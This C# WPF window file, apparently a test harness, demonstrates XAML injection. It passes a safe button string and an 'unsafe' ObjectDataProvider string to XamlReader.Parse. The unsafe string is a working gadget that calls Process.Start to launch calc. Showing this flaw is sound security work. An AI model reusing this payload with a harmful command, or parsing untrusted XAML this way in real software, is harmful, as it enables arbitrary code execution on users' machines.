using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace XamlParser.Test
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        const string safeString = "<Button xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' Background='Red' Content='Fancy Button' />";
        const string unsafeString = "<ObjectDataProvider xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml' xmlns:System='clr-namespace:System;assembly=mscorlib' xmlns:Diag='clr-namespace:System.Diagnostics;assembly=system' ObjectType='{x:Type Diag:Process}' MethodName='Start'><ObjectDataProvider.MethodParameters><System:String>calc</System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider>";

        private void Button_Click(object sender, RoutedEventArgs e)
        {
        }

        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            this.input.Text = safeString;
            this.host.Content = XamlReader.Parse(this.input.Text);
        }

        private void Button_Click2(object sender, RoutedEventArgs e)
        {
            this.input.Text = unsafeString;
            this.host.Content = XamlReader.Parse(this.input.Text);
        }
    }
}